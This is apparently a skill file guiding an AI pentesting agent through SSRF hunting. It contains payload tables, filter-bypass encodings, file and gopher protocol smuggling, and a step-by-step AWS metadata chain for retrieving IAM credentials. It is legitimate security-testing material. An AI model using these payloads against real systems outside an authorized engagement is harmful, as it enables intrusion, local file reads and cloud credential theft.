---
name: hunt-ssrf
description: Hunting skill for Server-Side Request Forgery (SSRF) — in-band metadata extraction, cloud IMDS abuse, protocol smuggling, DNS rebinding, blind confirmation, and filter-bypass families. Use when user input reaches a URL/URI fetcher, PDF/SSO/webhook generator, XML parser, or any server-side HTTP client.
---

# SSRF Hunting Methodology

SSRF lets you coerce the server into making requests you control. The impact ranges from internal recon to cloud credential theft to RCE. This skill covers black-box hunting.

## Deeper reference (load only if this specific situation applies)

- **`references/source-code-review.md`** — you have repo/source access (OSS bug, internal pentest, in-scope GitHub org). Covers grep targets, Semgrep rules, and the redirect-policy check. Not useful for pure black-box hunting.

## When to invoke

- Any parameter whose value becomes a URL: `url=`, `path=`, `src=`, `redirect=`, `next=`, `callback=`, `webhook=`, `rss=`, `feed=`, `image=`, `attachment=`, `pdf=`, `sso=`, `saml=`, `oidc=`.
- XML bodies with external entities or `<!DOCTYPE>`.
- PDF/Office/image generators that fetch remote resources.
- Features that "fetch and show" a URL: link previews, SSR, screenshot, import.
- Any stack running on a cloud provider (AWS/GCP/Azure/DO/Oracle) — IMDS is the crown jewel.

## Crown jewel targets

1. **Cloud metadata services** — `169.254.169.254`, `fd00:ec2::254`, `100.100.100.200` (Alibaba), `metadata.google.internal`.
2. **Internal services** — `localhost`, `127.0.0.1`, `0.0.0.0`, `::1`, known internal hostnames from error messages or DNS.
3. **K8s / container daemons** — kubelet (`10250`), Docker API (`2375`), etcd (`2379`), Istio control plane.
4. **Backend APIs** — services that trust localhost or internal networks and expose admin endpoints.

## In-band discovery probes

For each URL-like parameter, send variants and compare response:

| Payload | What to look for |
|---|---|
| `http://127.0.0.1/` | Local service banner, status change, error leak |
| `http://localhost/` | Same, some parsers treat it differently |
| `http://0.0.0.0/` | Bypasses some localhost filters |
| `http://[::1]/` | IPv6 localhost |
| `http://0177.0.0.1/` or `http://2130706433/` | Decimal/octal IP encoding |
| `http://127.1/` or `http://127.0.1/` | Short forms |
| `http://spoofed.burpcollaborator.net/127.0.0.1` | DNS A-record pointing to 127.0.0.1 |
| `file:///etc/passwd` | Protocol smuggling to LFI |
| `dict://127.0.0.1:11211/stat` | Memcached recon |
| `gopher://127.0.0.1:9000/_...` | FastCGI/Redis/SMTP abuse |
| `http://169.254.169.254/latest/meta-data/` | AWS IMDS v1 |
| `http://169.254.169.254/latest/api/token` + `X-aws-ec2-metadata-token-ttl-seconds: 21600` | AWS IMDS v2 token |
| `http://metadata.google.internal/computeMetadata/v1/` + `Metadata-Flavor: Google` | GCP |
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | Azure |

## Filter bypass ladder

If `127.0.0.1` or `169.254.169.254` is blocked, escalate through encodings:

1. **URL encoding**: `%31%32%37%2e%30%2e%30%2e%31`, `%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34`
2. **Double URL encoding**: `%2531%2532%2537...`
3. **Mixed case**: `HtTp://127.0.0.1/`
4. **Credentials**: `http://foo@127.0.0.1:80@evil.com` or `http://evil.com:80@127.0.0.1` (parser differentials)
5. **Path absolute URL**: `http://127.0.0.1%00.evil.com`
6. **DNS rebinding**: domain whose TTL is short and A record flips between attacker and target
7. **302 redirect**: host an endpoint on your server that redirects to `http://169.254.169.254/`
8. **IPv6 zone IDs**: `http://[::ffff:169.254.169.254%25eth0]`
9. **IDNA / Unicode**: `http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ` if parser IDNA-normalizes
10. **HTTP parameter pollution**: `url=127.0.0.1&url=evil.com` — different parsers pick different values

## Protocol smuggling

A URL parser may reject `http://` to localhost but accept:

- `file:///etc/passwd`
- `ftp://127.0.0.1/`
- `gopher://127.0.0.1:6379/_CONFIG%20GET%20dir`
- `dict://127.0.0.1:11211/version`
- `ldap://127.0.0.1:389/`
- `tftp://127.0.0.1:69/TEST`

Use these to fingerprint internal services, not just HTTP.

## Blind SSRF confirmation

When the response does not reflect the fetched content:

1. **Timing**: `http://127.0.0.1:22/` should time out differently than `http://127.0.0.1:80/`.
2. **DNS lookup**: trigger a DNS query to your callback host — proves parsing + resolution.
3. **HTTP callback**: inject your callback URL; an interaction proves outbound request.
4. **Error oracle**: malformed payloads on internal ports may leak different errors than blocked IPs.

If `oob-probe` is available, use it for callback confirmation. Otherwise rely on timing + error differential and record as `inferred`.

## Cloud IMDS exploitation

For AWS IMDS v1, the canonical chain is:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

1. Discover role name via `.../iam/security-credentials/`.
2. Fetch temporary credentials.
3. Use them with `aws sts get-caller-identity` or SDK calls.
4. Escalate via IAM privilege analysis (`cloud-iam-deep` skill).

For IMDS v2, first request a token:

```
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
```

Then replay with `X-aws-ec2-metadata-token: <token>` on metadata paths. Some servers forward the PUT but not the header; test both token-fetch and metadata-fetch paths.

## Depth floor

Do not report a surface exhausted until you have tried **at least 25 distinct payloads or bypass families** against each URL-like parameter. Record every negative result as a `record_fact` so the planner knows what was covered.

## Evidence gate

Before `report_finding`:
- For in-band SSRF: include the exact request/response showing the server fetched an internal/cloud resource.
- For blind SSRF: include timing distribution, DNS log, or callback interaction.
- For IMDS: include the full metadata path and redacted credential output (mask actual keys/tokens).
- Tag the finding `vulnclass: SSRF` and bind `traffic_refs`.

## Stop-authority

This skill decides *what SSRF vectors to try* and *how to verify*. It never decides when the entire vulnerability class is exhausted — that stays with `hunting-methodology`.
